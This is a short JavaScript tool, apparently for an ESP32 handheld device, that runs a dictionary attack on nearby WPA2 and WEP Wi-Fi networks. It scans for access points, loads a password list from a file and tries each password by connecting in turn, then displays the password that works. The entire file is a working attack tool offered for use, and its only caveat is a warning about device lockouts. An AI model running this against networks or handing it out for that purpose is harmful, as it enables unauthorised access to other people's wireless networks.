

// Wifi dictionary-based attacker
// use at your own risk, some devices may lock you out as a security mechanism when spammed with this!

function wifiDictAttack(ssid, pwds) {
  var connected = false;
  // iterate over the passwords
  for( var i=0; i<pwds.length; i++ ) {
      if(!pwds[i].trim()) continue;  // skip empty lines
      serialPrintln("Trying password for " + ssid + ": " + pwds[i]);
      dialogMessage("Trying pwd " + (i+1) + "/" + pwds.length);
      connected = wifiConnect(ssid, 3, pwds[i]);  // timeout is 3s
      if(connected) {
        serialPrintln("Password found for " + ssid + ": " + pwds[i]);
        dialogMessage("Pwd found: " + pwds[i], true);
        return;
      }
    }
  dialogError("Pwd not found", true);
}

var network_to_attack_ssid = "";
var passwords_to_try_arr = [];

while(true)
{
  
  var choice = dialogChoice([
    "Select AP", "scan",
    "Load dict", "load",
    "Start attack", "attack",
    ]
  )
  
  if(choice=="") {
    break;  // quit
  }
  if(choice=="scan") {
    dialogMessage("skanowanie");
    var networks = wifiScan();
    
    if(!networks.length) {
      dialogError("nie znaleziono wifi!");
      continue;
    }
    var networks_choices = [];
    for( var i=0 ; i < networks.length; i++ ) {
      if(networks[i].encryptionType == "WPA2_PSK" || networks[i].encryptionType == "WEP") {
        networks_choices.push(networks[i].SSID, networks[i].SSID);
      }
    }
    network_to_attack_ssid = dialogChoice(networks_choices);
  }
  else if(choice=="load") {
    var passwords_file = dialogPickFile("/");
    if(!passwords_file) continue;
    var passwords_to_try = storageRead(passwords_file);  // MEMO: 4kb file limit -> use native open+read?
    if(!passwords_to_try) continue;
    var raw_passwords = passwords_to_try.split("\n");
    passwords_to_try_arr = [];
    for (var i = 0; i < raw_passwords.length; i++) {
      var pwd = raw_passwords[i];
      pwd = pwd.replace(/\r/g, '').trim();
      if (pwd) {
        passwords_to_try_arr.push(pwd);
      }
    }
  }
  else if(choice=="attack") {
    if(!network_to_attack_ssid) {
      dialogError("no wifi network selected, pls rescan");
      continue;
    }
    if(passwords_to_try_arr.length == 0) {
      dialogError("no passwords dict loaded");
      continue;
    }
    //print("trying attacking network " + networks[i].SSID + " " + networks[i].MAC);
    dialogMessage("Attacking..");

    wifiDictAttack(network_to_attack_ssid, passwords_to_try_arr);
    
    wifiDisconnect();  // avoid automatic reconnection retry to the last network
  } // end if attack
  
  fillScreen(0); // clear screen
}


// 2FIX: tries to reconnect? https://github.com/espressif/arduino-esp32/issues/7968

